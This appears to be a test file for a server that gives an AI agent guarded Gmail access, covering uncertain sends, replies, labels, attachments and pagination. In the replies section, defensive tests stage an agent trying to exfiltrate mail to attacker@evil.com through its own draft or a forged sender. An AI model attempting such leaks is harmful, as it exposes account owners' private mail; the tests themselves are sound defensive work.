// Review + security round: uncertain sends, replies via drafts, labels and attachments, and pagination.

import { afterEach, describe, expect, it } from "vitest";
import type { GrantInput } from "../shared/types.ts";
import { GoogleApiError } from "../server/google/types.ts";
import { connectAgent, grantInput, mailTestContext } from "./helpers.ts";
import { decodeRaw } from "./fake-google.ts";

let cleanup: (() => Promise<void>)[] = [];
afterEach(async () => {
  for (const fn of cleanup.reverse()) await fn();
  cleanup = [];
});

const ME = "me@acme.com";

async function setup(grant: Partial<GrantInput> = {}) {
  const t = mailTestContext();
  cleanup.push(t.dispose);
  const gmail = t.addAccount("acc_a", ME);
  gmail.labels.push({ id: "Label_support", name: "Support", type: "user" }, { id: "Label_private", name: "Private", type: "user" });
  gmail
    .add({
      id: "m1",
      threadId: "t1",
      labelIds: ["INBOX", "Label_support"],
      from: { name: "Alice", email: "alice@client.com" },
      to: [{ name: null, email: ME }],
      cc: [{ name: "Carol", email: "carol@partner.com" }],
      subject: "Help",
      text: "hi",
      attachments: [
        { id: "a1", filename: "a.txt", mimeType: "text/plain", data: Buffer.from("aaa") },
        { id: "a2", filename: "b.txt", mimeType: "text/plain", data: Buffer.from("bbb") },
      ],
    })
    .add({ id: "m3", threadId: "t2", labelIds: ["INBOX", "Label_private"], from: { name: null, email: "x@bank.com" }, to: [{ name: null, email: ME }], subject: "Private", text: "secret" });
  const { agent } = t.addAgent("bot", [grantInput("acc_a", { level: "full", ...grant })]);
  const mcp = await connectAgent(t.ctx, agent.id, "bot");
  cleanup.push(mcp.close);
  const audits = (action?: string) => t.ctx.audit.list({ agentId: agent.id, action, limit: 200 }).items;
  return { ...t, gmail, agent, ...mcp, audits };
}

describe("uncertain sends", () => {
  it("a send that definitely failed can be retried", async () => {
    const s = await setup();
    const send = s.gmail.send.bind(s.gmail);
    s.gmail.send = async () => {
      throw new GoogleApiError(400, "Invalid To header");
    };
    expect((await s.call("send_message", { to: "a@client.com", subject: "s", body: "b" })).text).toMatch(/Gmail rejected the request/);
    s.gmail.send = send;
    expect((await s.call("send_message", { to: "a@client.com", subject: "s", body: "b" })).isError).toBe(false);
  });

  it.each([
    ["a Gmail 5xx", new GoogleApiError(503, "backend error")],
    ["a network failure", new TypeError("fetch failed")],
    ["a timeout", new GoogleApiError(0, "Google (gmail.googleapis.com) didn't respond within 30s", "timeout")],
    ["a reset connection", new GoogleApiError(0, "Could not reach Google (gmail.googleapis.com): ECONNRESET", "network", { reasons: ["ECONNRESET"] })],
  ])("reports a send that may have gone through (%s)", async (_name, err) => {
    const s = await setup();
    s.gmail.send = async () => {
      throw err;
    };
    const r = await s.call("send_message", { to: "a@client.com", subject: "s", body: "b" });
    expect(r.text).toMatch(/may or may not have been sent\. Check .*in:sent/);
    expect(s.audits("send_message")[0]).toMatchObject({ outcome: "error", reason: "send_uncertain", detail: expect.objectContaining({ maybeSent: true }) });
  });

  it("treats a connection that never reached Gmail as not sent", async () => {
    const s = await setup();
    const send = s.gmail.send;
    s.gmail.send = async () => {
      throw new GoogleApiError(0, "Could not reach Google (gmail.googleapis.com): ECONNREFUSED", "network", { reasons: ["ECONNREFUSED"] });
    };
    const r = await s.call("send_message", { to: "a@client.com", subject: "s", body: "b" });
    expect(r.text).not.toMatch(/may or may not/);
    expect(s.audits("send_message")[0]!.detail).not.toHaveProperty("maybeSent");
    s.gmail.send = send;
    expect((await s.call("send_message", { to: "a@client.com", subject: "s", body: "b" })).isError).toBe(false);
  });
});

describe("replies", () => {
  it("can't reply to its own draft to reach new recipients (PoC M1)", async () => {
    const s = await setup();
    const d = await s.call("create_draft", { to: "attacker@evil.com", subject: "Re: Help", body: "loot", thread_id: "t1" });
    const raw = decodeRaw(s.gmail.drafts.get(JSON.parse(d.text).draftId)!.raw);
    // Real Gmail lists the draft as a DRAFT-labelled message in the thread, From = the account.
    s.gmail.add({ id: "dm-x", threadId: "t1", labelIds: ["DRAFT"], from: raw.from, to: raw.to, subject: raw.subject, text: raw.text });
    const r = await s.call("reply", { message_id: "dm-x", body: "secrets" });
    expect(r.isError).toBe(true);
    expect(r.text).toMatch(/is a draft/);
    expect(s.gmail.sent).toHaveLength(0);
  });

  it("a message merely claiming to be from the account (no SENT label) doesn't redirect replies", async () => {
    const s = await setup();
    s.gmail.add({ id: "fake", threadId: "t1", labelIds: ["INBOX", "Label_support"], from: { name: null, email: ME }, to: [{ name: null, email: "attacker@evil.com" }], subject: "x", text: "x" });
    const r = await s.call("reply", { message_id: "fake", body: "hi" });
    expect(r.text).toMatch(/no one to reply to/);
    expect(s.gmail.sent).toHaveLength(0);
  });

  it("allows replying (and replying all) to people already in the thread", async () => {
    const s = await setup();
    expect((await s.call("reply", { message_id: "m1", body: "ok", reply_all: true })).isError).toBe(false);
    expect(decodeRaw(s.gmail.sent[0]!.raw).cc?.map((a) => a.email)).toEqual(["carol@partner.com"]);
  });

  it("replies to the Reply-To of a received message", async () => {
    const s = await setup();
    s.gmail.add({
      id: "m9",
      threadId: "t9",
      labelIds: ["INBOX"],
      from: { name: null, email: "bob@client.com" },
      replyTo: [{ name: null, email: "bob@client.com" }],
      to: [{ name: null, email: ME }],
      subject: "s",
      text: "x",
    });
    expect((await s.call("reply", { message_id: "m9", body: "ok" })).isError).toBe(false);
    expect(decodeRaw(s.gmail.sent[0]!.raw).to?.map((a) => a.email)).toEqual(["bob@client.com"]);
  });
});

describe("allowlist hints", () => {
  it("suggests reply_all: false when only the extra reply-all recipients are blocked", async () => {
    const s = await setup({ allowTo: ["*@client.com"] });
    const r = await s.call("reply", { message_id: "m1", body: "ok", reply_all: true });
    expect(r.text).toMatch(/carol@partner.com.*reply_all: false/);
    expect(s.audits("reply")[0]).toMatchObject({ outcome: "denied", reason: "allow_to" });
  });
});

describe("labels", () => {
  it("list_labels shows every label", async () => {
    const s = await setup();
    const r = await s.call("list_labels");
    expect(r.text).toContain("Support (id Label_support)");
    expect(r.text).toContain("Private");
  });

  it("modify_labels can add any user label", async () => {
    const s = await setup();
    expect((await s.call("modify_labels", { thread_id: "t1", add: ["Private"] })).isError).toBe(false);
  });
});

describe("label cache", () => {
  it("looks labels up again (fresh) when a name is missing from the cache", async () => {
    const s = await setup();
    s.google.staleLabels.set("acc_a", [...s.gmail.labels]);
    s.gmail.labels.push({ id: "Label_new", name: "New Things", type: "user" });
    s.google.labelCalls.length = 0;
    expect((await s.call("modify_labels", { thread_id: "t1", add: ["New Things"] })).isError).toBe(false);
    expect(s.google.labelCalls).toEqual([null, { fresh: true }]);

    // A name missing even from a fresh list isn't refetched again right away.
    s.google.labelCalls.length = 0;
    await s.call("modify_labels", { thread_id: "t1", add: ["Nope"] });
    await s.call("modify_labels", { thread_id: "t1", add: ["Nope"] });
    expect(s.google.labelCalls.filter((c) => c?.fresh)).toHaveLength(1);
  });
});

describe("attachments", () => {
  it("fetches by stable part id and never passes unlisted ids to Gmail", async () => {
    const s = await setup();
    const asked: string[] = [];
    const get = s.gmail.getAttachment.bind(s.gmail);
    s.gmail.getAttachment = async (m: string, a: string) => {
      asked.push(a);
      return get(m, a);
    };
    const byPart = await s.call("get_attachment", { message_id: "m1", attachment_id: "2" });
    expect(byPart.text).toContain("Attachment b.txt");
    expect(byPart.text).toContain("bbb");
    const unlisted = await s.call("get_attachment", { message_id: "m1", attachment_id: "ATTACHMENT-OF-ANOTHER-MSG" });
    expect(unlisted.isError).toBe(true);
    expect(unlisted.text).toMatch(/has no attachment .*Its attachments: 1 \(a\.txt\), 2 \(b\.txt\)/);
    expect(asked).toEqual(["a2"]);
  });
});

describe("search pagination", () => {
  it("returns the page token even when a page has no visible results", async () => {
    const s = await setup();
    s.gmail.messages.delete("m1");
    s.gmail.messages.delete("m3");
    s.gmail.nextPageToken = "tok2";
    const r = await s.call("search_threads", { query: "" });
    expect(r.text).toMatch(/No results you can access on this page; more may follow\. More results: call again with page_token "tok2"/);
  });
});

describe("events", () => {
  it("mentions more events when the feed says so", async () => {
    const s = await setup();
    const feed = s.ctx.events.feed.bind(s.ctx.events);
    s.ctx.events.feed = (agentId, opts) => ({ ...feed(agentId, opts), hasMore: true }) as ReturnType<typeof feed>;
    expect((await s.call("list_events")).text).toMatch(/More events may be available; call again with after=0/);
  });
});
